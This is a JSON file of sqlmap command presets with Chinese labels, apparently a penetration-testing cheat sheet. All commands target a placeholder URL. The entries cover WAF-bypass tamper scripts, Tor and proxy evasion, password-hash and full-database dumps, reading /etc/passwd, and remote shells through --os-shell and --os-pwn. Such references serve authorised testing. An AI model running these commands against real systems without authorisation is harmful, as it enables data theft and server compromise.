{
  "SQLMap": [
    { "name": "基础：目标URL", "command": "sqlmap -u \"<url>\"" },
    { "name": "基础：GET参数指定", "command": "sqlmap -u \"<url>?id=1\" -p id" },
    { "name": "基础：POST数据注入", "command": "sqlmap -u \"<url>\" --data \"id=1&name=test\" -p id" },
    { "name": "基础：从请求文件加载（Burp等）", "command": "sqlmap -r request.txt" },
    { "name": "基础：批量目标文件", "command": "sqlmap -m targets.txt" },
    { "name": "基础：从代理日志解析目标", "command": "sqlmap -l burp.log" },
    { "name": "基础：Google Dork 结果作为目标", "command": "sqlmap -g \"inurl:php?id=\"" },
    { "name": "基础：从INI配置加载", "command": "sqlmap -c sqlmap.conf" },
    { "name": "基础：直接数据库连接（绕过Web层）", "command": "sqlmap -d \"mysql://user:pass@host:3306/dbname\"" },
    { "name": "基础：自动默认应答", "command": "sqlmap --batch -u \"<url>\"" },
    { "name": "基础：高级帮助", "command": "sqlmap -hh" },
    { "name": "基础：设置详细输出等级", "command": "sqlmap -v 3 -u \"<url>\"" },

    { "name": "请求：自定义User-Agent", "command": "sqlmap -u \"<url>\" --user-agent \"Mozilla/5.0 (Pentest)\"" },
    { "name": "请求：随机User-Agent", "command": "sqlmap -u \"<url>\" --random-agent" },
    { "name": "请求：额外HTTP头", "command": "sqlmap -u \"<url>\" --headers \"X-Forwarded-For: 127.0.0.1\\nAccept-Language: zh-CN\"" },
    { "name": "请求：强制HTTP方法", "command": "sqlmap -u \"<url>\" --method=PUT --data \"id=1\"" },
    { "name": "请求：Cookie注入", "command": "sqlmap -u \"<url>\" --cookie \"PHPSESSID=...; security=low\"" },
    { "name": "请求：加载Netscape/Wget格式Cookie", "command": "sqlmap -u \"<url>\" --load-cookies cookies.txt" },
    { "name": "请求：忽略响应Set-Cookie", "command": "sqlmap -u \"<url>\" --drop-set-cookie" },
    { "name": "请求：模拟手机UA", "command": "sqlmap -u \"<url>\" --mobile" },
    { "name": "请求：Host/Referer伪造", "command": "sqlmap -u \"<url>\" --host \"vhost.local\" --referer \"https://ref.example/\"" },
    { "name": "请求：忽略错误码", "command": "sqlmap -u \"<url>\" --ignore-code=401,403" },
    { "name": "请求：忽略系统代理", "command": "sqlmap -u \"<url>\" --ignore-proxy" },
    { "name": "请求：忽略跳转/超时", "command": "sqlmap -u \"<url>\" --ignore-redirects --ignore-timeouts" },
    { "name": "请求：HTTP代理", "command": "sqlmap -u \"<url>\" --proxy \"http://127.0.0.1:8080\"" },
    { "name": "请求：代理认证", "command": "sqlmap -u \"<url>\" --proxy \"http://127.0.0.1:8080\" --proxy-cred \"user:pass\"" },
    { "name": "请求：代理列表文件轮换", "command": "sqlmap -u \"<url>\" --proxy-file proxies.txt --proxy-freq 10" },
    { "name": "请求：使用Tor网络", "command": "sqlmap -u \"<url>\" --tor --tor-type=SOCKS5 --tor-port 9050 --check-tor" },
    { "name": "请求：请求延迟与超时", "command": "sqlmap -u \"<url>\" --delay=0.5 --timeout=30 --retries=2" },
    { "name": "请求：参数值随机化", "command": "sqlmap -u \"<url>?id=1\" --randomize=id" },
    { "name": "请求：安全URL心跳", "command": "sqlmap -u \"<url>\" --safe-url \"https://safe.example/\" --safe-freq 10" },
    { "name": "请求：安全POST心跳", "command": "sqlmap -u \"<url>\" --safe-post \"a=1&b=2\" --safe-freq 10" },
    { "name": "请求：安全请求文件", "command": "sqlmap -u \"<url>\" --safe-req safe.req" },
    { "name": "请求：跳过URL编码", "command": "sqlmap -u \"<url>\" --skip-urlencode --data \"raw=payload\"" },
    { "name": "请求：CSRF令牌自动提取", "command": "sqlmap -u \"<url>\" --csrf-token=csrf --csrf-url \"https://<url>/form\" --csrf-method=GET --csrf-retries 2" },
    { "name": "请求：强制HTTPS", "command": "sqlmap -u \"https://<url>\" --force-ssl" },
    { "name": "请求：分块传输编码（POST）", "command": "sqlmap -u \"<url>\" --chunked --data \"id=1\"" },
    { "name": "请求：HTTP参数污染(HPP)", "command": "sqlmap -u \"<url>?id=1\" --hpp" },
    { "name": "请求：预评估Python代码生成参数", "command": "sqlmap -u \"<url>\" --eval \"import hashlib; id=hashlib.md5('1'.encode()).hexdigest()\"" },

    { "name": "优化：全部优化开关", "command": "sqlmap -u \"<url>\" -o" },
    { "name": "优化：预测常见输出", "command": "sqlmap -u \"<url>\" --predict-output" },
    { "name": "优化：持久连接Keep-Alive", "command": "sqlmap -u \"<url>\" --keep-alive" },
    { "name": "优化：空连接测长度", "command": "sqlmap -u \"<url>\" --null-connection" },
    { "name": "优化：并发线程数", "command": "sqlmap -u \"<url>\" --threads=10" },

    { "name": "注入：选择测试参数", "command": "sqlmap -u \"<url>?id=1&name=a\" -p id,name" },
    { "name": "注入：跳过指定参数", "command": "sqlmap -u \"<url>?id=1&name=a\" --skip=name" },
    { "name": "注入：仅测试POST参数", "command": "sqlmap -u \"<url>\" --data \"id=1&name=a\" --param-filter=POST" },
    { "name": "注入：排除正则匹配参数", "command": "sqlmap -u \"<url>?sid=1&id=2\" --param-exclude \"^s.*\"" },
    { "name": "注入：设置风险与等级", "command": "sqlmap -u \"<url>\" --risk=3 --level=5" },
    { "name": "注入：指定技术类型", "command": "sqlmap -u \"<url>\" --technique=BEUSTQ" },
    { "name": "注入：时间延迟秒数", "command": "sqlmap -u \"<url>\" --time-sec=2" },
    { "name": "注入：前后缀固定包裹", "command": "sqlmap -u \"<url>\" --prefix \"')\" --suffix \"-- \"" },
    { "name": "注入：启用启发式检测", "command": "sqlmap -u \"<url>\" --heuristic" },
    { "name": "注入：不进行类型转换", "command": "sqlmap -u \"<url>\" --no-cast" },
    { "name": "注入：强制DBMS类型", "command": "sqlmap -u \"<url>\" --dbms=mysql" },
    { "name": "注入：使用Tamper脚本（常见绕过）", "command": "sqlmap -u \"<url>\" --tamper=space2comment,between,randomcase,charunicodeescape" },
    { "name": "注入：更多WAF绕过脚本组合", "command": "sqlmap -u \"<url>\" --tamper=equaltolike,modsecurityversioned,apostrophe2hex,nonrecursivereplacement" },
    { "name": "注入：解析数据库错误信息", "command": "sqlmap -u \"<url>\" --parse-errors" },
    { "name": "注入：刷新会话缓存", "command": "sqlmap -u \"<url>\" --flush-session" },
    { "name": "注入：强制新查询", "command": "sqlmap -u \"<url>\" --fresh-queries" },

    { "name": "指纹/信息：指纹识别", "command": "sqlmap -u \"<url>\" -f" },
    { "name": "指纹/信息：DBMS横幅", "command": "sqlmap -u \"<url>\" --banner" },
    { "name": "指纹/信息：当前用户", "command": "sqlmap -u \"<url>\" --current-user" },
    { "name": "指纹/信息：当前数据库", "command": "sqlmap -u \"<url>\" --current-db" },
    { "name": "指纹/信息：服务器主机名", "command": "sqlmap -u \"<url>\" --hostname" },
    { "name": "指纹/信息：是否DBA权限", "command": "sqlmap -u \"<url>\" --is-dba" },

    { "name": "枚举：所有数据库", "command": "sqlmap -u \"<url>\" --dbs" },
    { "name": "枚举：指定库的所有表", "command": "sqlmap -u \"<url>\" -D dbname --tables --exclude-sysdbs" },
    { "name": "枚举：指定表的列", "command": "sqlmap -u \"<url>\" -D dbname -T users --columns" },
    { "name": "枚举：显示模式信息（schema）", "command": "sqlmap -u \"<url>\" --schema" },
    { "name": "枚举：计数模式", "command": "sqlmap -u \"<url>\" --count -D dbname -T users" },
    { "name": "枚举：枚举所有用户", "command": "sqlmap -u \"<url>\" --users" },
    { "name": "枚举：枚举用户密码哈希", "command": "sqlmap -u \"<url>\" --passwords" },
    { "name": "枚举：枚举权限", "command": "sqlmap -u \"<url>\" --privileges" },
    { "name": "枚举：枚举角色", "command": "sqlmap -u \"<url>\" --roles" },
    { "name": "枚举：搜索库/表/列", "command": "sqlmap -u \"<url>\" --search -D \"auth\" -T \"users\" -C \"pass\"" },
    { "name": "枚举：常见表名字典", "command": "sqlmap -u \"<url>\" --common-tables" },
    { "name": "枚举：常见列名字典", "command": "sqlmap -u \"<url>\" --common-columns" },
    { "name": "枚举：常见关键词字典", "command": "sqlmap -u \"<url>\" --common-words" },

    { "name": "导出：导出指定表列", "command": "sqlmap -u \"<url>\" -D dbname -T users -C \"id,username,password\" --dump" },
    { "name": "导出：带条件导出", "command": "sqlmap -u \"<url>\" -D dbname -T users --dump --where \"id>100\"" },
    { "name": "导出：限制条数/起止", "command": "sqlmap -u \"<url>\" -D dbname -T users --dump --limit 50" },
    { "name": "导出：导出所有库所有表", "command": "sqlmap -u \"<url>\" --dump-all --exclude-sysdbs" },
    { "name": "导出：输出十六进制", "command": "sqlmap -u \"<url>\" --hex -D dbname -T bin --dump" },
    { "name": "导出：二进制字段处理", "command": "sqlmap -u \"<url>\" --binary-fields password_hash -D dbname -T users --dump" },

    { "name": "操作系统：执行单条命令", "command": "sqlmap -u \"<url>\" --os-cmd \"id\"" },
    { "name": "操作系统：交互式OS Shell", "command": "sqlmap -u \"<url>\" --os-shell" },
    { "name": "操作系统：OS接管（Meterpreter/VNC）", "command": "sqlmap -u \"<url>\" --os-pwn --msf-path \"/opt/metasploit/\"" },
    { "name": "操作系统：指定临时目录", "command": "sqlmap -u \"<url>\" --tmp-path \"/tmp\"" },

    { "name": "文件系统：读取远端文件", "command": "sqlmap -u \"<url>\" --file-read \"/etc/passwd\"" },
    { "name": "文件系统：上传写入远端文件", "command": "sqlmap -u \"<url>\" --file-write \"local.bin\" --file-dest \"/tmp/remote.bin\"" },

    { "name": "UDF：注入用户自定义函数(MySQL)", "command": "sqlmap -u \"<url>\" --udf-inject" },
    { "name": "UDF：恢复用户自定义函数(MySQL)", "command": "sqlmap -u \"<url>\" --udf-recover" },

    { "name": "认证：HTTP认证（Basic/Digest/NTLM/PKI）", "command": "sqlmap -u \"<url>\" --auth-type=Basic --auth-cred \"user:pass\"" },
    { "name": "认证：PKI证书文件", "command": "sqlmap -u \"<url>\" --auth-type=PKI --auth-file cert.pem" },

    { "name": "表单与爬取：测试页面表单", "command": "sqlmap -u \"<url>\" --forms" },
    { "name": "表单与爬取：爬取深度并测试", "command": "sqlmap -u \"<url>\" --crawl=3" },

    { "name": "安全与维护：清理（移除落地构件）", "command": "sqlmap -u \"<url>\" --cleanup" },
    { "name": "安全与维护：更新到最新版本", "command": "sqlmap --update" },
    { "name": "安全与维护：自定义默认回答", "command": "sqlmap -u \"<url>\" --answers \"follow=Y,keep=N\"" }
  ]
}
